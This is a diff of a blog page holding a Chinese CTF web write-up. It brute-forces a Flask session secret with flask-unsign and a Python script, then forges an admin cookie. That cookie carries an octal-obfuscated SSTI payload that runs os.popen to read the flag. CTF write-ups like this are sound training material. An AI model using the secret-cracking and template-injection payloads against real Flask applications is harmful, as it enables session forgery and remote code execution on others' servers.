@@ -27,7 +27,7 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://laijunyue.github.io/images/image-20250902160538081.png">
 <meta property="article:published_time" content="2024-09-10T00:27:16.000Z">
-<meta property="article:modified_time" content="2025-09-16T06:53:47.389Z">
+<meta property="article:modified_time" content="2025-10-24T10:08:32.434Z">
 <meta property="article:author" content="xiaolaisec">
 <meta property="article:tag" content="CTF">
 <meta property="article:tag" content="JAVA">
@@ -353,7 +353,7 @@
 
         <div class="statistics flex justify-around my-2.5">
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
-        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">7</div>
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">13</div>
         <div class="label text-third-text-color text-sm">Tags</div>
     </a>
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
@@ -361,7 +361,7 @@
         <div class="label text-third-text-color text-sm">Categories</div>
     </a>
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
-        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">20</div>
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">29</div>
         <div class="label text-third-text-color text-sm">Posts</div>
     </a>
 </div>
@@ -415,8 +415,8 @@
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2025-09-16 14:53:47</span>
-            <span class="mobile">2025-09-16 14:53:47</span>
+            <span class="desktop">2025-10-24 18:08:32</span>
+            <span class="mobile">2025-10-24 18:08:32</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -471,6 +471,9 @@
 
 <h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>主要漏洞点有两个，<strong>一是&#x2F;admin路由下merge函数存在原型链污染</strong>，<strong>二是&#x2F;admin&#x2F;view_inventory路由下render_template_string函数存在SSTI</strong>。</p>
 <p>首先要获得admin权限，目前无法访问&#x2F;admin路由进行原型链污染secret_key，只能爆破</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flask-unsign --unsign --cookie &quot;eyJfcGVybWFuZW50Ijp0cnVlLCJ1c2VybmFtZSI6Imd1ZXN0In0.Xm2ZFg.-quLR22o3jUH0PzdlVtj4m4Aecg&quot;</span><br></pre></td></tr></table></figure></div>
+
+<p>或写脚本</p>
 <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> flask_unsign</span><br><span class="line"><span class="keyword">from</span> flask_unsign.helpers <span class="keyword">import</span> wordlist</span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> r</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">path = <span class="string">&quot;../my_wordlist.txt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Generating wordlist... &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#如果wordlist.txt为自定义字典，注释掉下面三行</span></span><br><span class="line"><span class="comment"># with open(path,&quot;w&quot;) as f:</span></span><br><span class="line"><span class="comment">#     #permutations with repetition</span></span><br><span class="line"><span class="comment">#     [f.write(&#x27;&#x27;+&quot;&quot;.join(x)+&#x27;&#x27;+&quot;\n&quot;) for x in itertools.product(&#x27;0123456789abcdefghijklmnopqrstuvwxyzQWERTYUIOPLKJHGFDSAZXCVBNM&#x27;, repeat=4)]   #加上前缀</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#url = &quot;http://47.115.201.35:8000/index&quot;</span></span><br><span class="line"><span class="comment">#cookie_tamper = r.head(url).cookies.get_dict()[&#x27;session&#x27;]</span></span><br><span class="line">cookie_tamper=<span class="string">&#x27;eyJjc3JmX3Rva2VuIjoiZjA1YjlmY2FkMjczNzcyNDFhYjY1ZWZhZGY2YmYzOWE2NWY5YzcxNSIsImlkZW50aXR5IjoiZ3Vlc3QiLCJ1c2VybmFtZSI6IkpheTE3In0.Zt00Pw.GxBaXRtuaBeDFi8npGhKn2J1-cc&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Got cookie: &quot;</span> + cookie_tamper)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Cracker Started...&quot;</span>)</span><br><span class="line"></span><br><span class="line">obj = flask_unsign.Cracker(value=cookie_tamper)</span><br><span class="line"></span><br><span class="line">before = time.time()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> wordlist(path, parse_lines=<span class="literal">False</span>) <span class="keyword">as</span> iterator:</span><br><span class="line">            obj.crack(iterator)</span><br><span class="line"></span><br><span class="line">secret = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">if</span> obj.secret:</span><br><span class="line">    secret =obj.secret.decode()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Found SECRET_KET ~<span class="subst">&#123;secret&#125;</span>~ in <span class="subst">&#123;time.time()-before&#125;</span> seconds&quot;</span>)</span><br><span class="line"></span><br><span class="line">signer = flask_unsign.sign(&#123;<span class="string">&quot;time&quot;</span>:time.time(),<span class="string">&quot;authorized&quot;</span>:<span class="literal">True</span>&#125;,secret=secret)</span><br></pre></td></tr></table></figure></div>
 
 <p><img  
@@ -490,7 +493,7 @@
 <p>利用8进制绕过sanitize_inventory_sold，通过原型链将payload写到inventory或sold中</p>
 <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.__class__转为[<span class="string">&#x27;XXXXXX&#x27;</span>]</span><br><span class="line">[<span class="number">0</span>]不动</span><br><span class="line">()不动</span><br><span class="line">[<span class="string">&#x27;eval&#x27;</span>]转为[<span class="string">&#x27;XXXXXX&#x27;</span>]</span><br><span class="line">(<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;【RCE】&quot;).read()&#x27;</span>)转为(<span class="string">&#x27;XXXXXX&#x27;</span>)</span><br></pre></td></tr></table></figure></div>
 
-<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">find /tmp -name flag</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">tac</span> /tmp/c05cac2af98893714d14d6107237f915/cbd2c352aaf912c8db7eabf2a9c71aa2/47ea5fa69ceb675b7023a3ff6b110012/flag</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flask-unsign --sign --cookie &quot;&#123;&#x27;csrf_token&#x27;: &#x27;f05b9fcad27377241ab65efadf6bf39a65f9c715&#x27;, &#x27;identity&#x27;: &#x27;admin&#x27;, &#x27;username&#x27;: &#x27;Jay17&#x27;,&#x27;__init__&#x27;:&#123;&#x27;__globals__&#x27;:&#123;&#x27;inventory&#x27;:&#x27;&#123;&#123;\&#x27;\&#x27;[\&#x27;\\137\\137\\143\\154\\141\\163\\163\\137\\137\&#x27;][\&#x27;\\137\\137\\142\\141\\163\\145\\163\\137\\137\&#x27;][0][\&#x27;\\137\\137\\163\\165\\142\\143\\154\\141\\163\\163\\145\\163\\137\\137\&#x27;]()[133][\&#x27;\\137\\137\\151\\156\\151\\164\\137\\137\&#x27;][\&#x27;\\137\\137\\147\\154\\157\\142\\141\\154\\163\\137\\137\&#x27;][\&#x27;\\137\\137\\142\\165\\151\\154\\164\\151\\156\\163\\137\\137\&#x27;][\&#x27;\\145\\166\\141\\154\&#x27;](\&#x27;\\137\\137\\151\\155\\160\\157\\162\\164\\137\\137\\050\\042\\157\\163\\042\\051\\056\\160\\157\\160\\145\\156\\050\\042\\164\\141\\143\\040\\057\\164\\155\\160\\057\\143\\060\\065\\143\\141\\143\\062\\141\\146\\071\\070\\070\\071\\063\\067\\061\\064\\144\\061\\064\\144\\066\\061\\060\\067\\062\\063\\067\\146\\071\\061\\065\\057\\143\\142\\144\\062\\143\\063\\065\\062\\141\\141\\146\\071\\061\\062\\143\\070\\144\\142\\067\\145\\141\\142\\146\\062\\141\\071\\143\\067\\061\\141\\141\\062\\057\\064\\067\\145\\141\\065\\146\\141\\066\\071\\143\\145\\142\\066\\067\\065\\142\\067\\060\\062\\063\\141\\063\\146\\146\\066\\142\\061\\061\\060\\060\\061\\062\\057\\146\\154\\141\\147\\042\\051\\056\\162\\145\\141\\144\\050\\051\&#x27;)&#125;&#125;&#x27;&#125;&#125;&#125;&quot; --secret &#x27;a123456&#x27;</span><br></pre></td></tr></table></figure></div>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">find /tmp -name flag</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">tac</span> /tmp/c05cac2af98893714d14d6107237f915/cbd2c352aaf912c8db7eabf2a9c71aa2/47ea5fa69ceb675b7023a3ff6b110012/flag</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flask-unsign --sign --cookie &quot;&#123;&#x27;csrf_token&#x27;: &#x27;f05b9fcad27377241ab65efadf6bf39a65f9c715&#x27;, &#x27;identity&#x27;: &#x27;admin&#x27;, &#x27;username&#x27;: &#x27;admin&#x27;,&#x27;__init__&#x27;:&#123;&#x27;__globals__&#x27;:&#123;&#x27;inventory&#x27;:&#x27;&#123;&#123;\&#x27;\&#x27;[\&#x27;\\137\\137\\143\\154\\141\\163\\163\\137\\137\&#x27;][\&#x27;\\137\\137\\142\\141\\163\\145\\163\\137\\137\&#x27;][0][\&#x27;\\137\\137\\163\\165\\142\\143\\154\\141\\163\\163\\145\\163\\137\\137\&#x27;]()[133][\&#x27;\\137\\137\\151\\156\\151\\164\\137\\137\&#x27;][\&#x27;\\137\\137\\147\\154\\157\\142\\141\\154\\163\\137\\137\&#x27;][\&#x27;\\137\\137\\142\\165\\151\\154\\164\\151\\156\\163\\137\\137\&#x27;][\&#x27;\\145\\166\\141\\154\&#x27;](\&#x27;\\137\\137\\151\\155\\160\\157\\162\\164\\137\\137\\050\\042\\157\\163\\042\\051\\056\\160\\157\\160\\145\\156\\050\\042\\164\\141\\143\\040\\057\\164\\155\\160\\057\\143\\060\\065\\143\\141\\143\\062\\141\\146\\071\\070\\070\\071\\063\\067\\061\\064\\144\\061\\064\\144\\066\\061\\060\\067\\062\\063\\067\\146\\071\\061\\065\\057\\143\\142\\144\\062\\143\\063\\065\\062\\141\\141\\146\\071\\061\\062\\143\\070\\144\\142\\067\\145\\141\\142\\146\\062\\141\\071\\143\\067\\061\\141\\141\\062\\057\\064\\067\\145\\141\\065\\146\\141\\066\\071\\143\\145\\142\\066\\067\\065\\142\\067\\060\\062\\063\\141\\063\\146\\146\\066\\142\\061\\061\\060\\060\\061\\062\\057\\146\\154\\141\\147\\042\\051\\056\\162\\145\\141\\144\\050\\051\&#x27;)&#125;&#125;&#x27;&#125;&#125;&#125;&quot; --secret &#x27;a123456&#x27;</span><br></pre></td></tr></table></figure></div>
 
 
         </div>
@@ -506,7 +509,7 @@
         
             <li>
                 <strong>Updated at
-                    :</strong> 2025-09-16 14:53:47
+                    :</strong> 2025-10-24 18:08:32
             </li>
         
         <li>
@@ -558,13 +561,13 @@
                     <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                         <a class="prev"
                         rel="prev"
-                        href="/2024/10/12/2024%E7%BE%8A%E5%9F%8E%E6%9D%AFWP/"
+                        href="/2024/09/25/XGCTF_%E8%A5%BF%E7%93%9C%E6%9D%AF%20WEB%20WP/"
                         >
                             <span class="left arrow-icon flex justify-center items-center">
                                 <i class="fa-solid fa-chevron-left"></i>
                             </span>
                             <span class="title flex justify-center items-center">
-                                <span class="post-nav-title-item">2024羊城杯WP</span>
+                                <span class="post-nav-title-item">XGCTF_西瓜杯 WEB WP</span>
                                 <span class="post-nav-item">Prev posts</span>
                             </span>
                         </a>
